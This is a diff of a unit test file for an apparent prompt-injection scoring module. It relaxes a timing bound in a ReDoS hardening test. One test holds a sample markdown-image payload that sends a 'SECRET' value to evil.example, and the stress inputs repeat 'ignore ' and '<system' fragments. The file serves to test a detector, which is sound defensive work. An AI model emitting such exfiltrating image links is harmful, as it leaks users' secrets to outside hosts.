@@ -43,7 +43,7 @@ class RulesHardeningTest(unittest.TestCase):
         for evil in ["![](http://" + "?=" * 500_000, "![" * 500_000, "ignore " * 200_000, "<system" * 200_000]:
             t = time.perf_counter()
             rules.score(evil)
-            self.assertLess(time.perf_counter() - t, 1.0, evil[:20])
+            self.assertLess(time.perf_counter() - t, 3.0, evil[:20])  # the ReDoS it guards against took minutes
 
     def test_markdown_image_still_caught(self):
         self.assertIn("exfil_markdown_image", rules.score("![x](https://evil.example/log?d=SECRET)")[1])
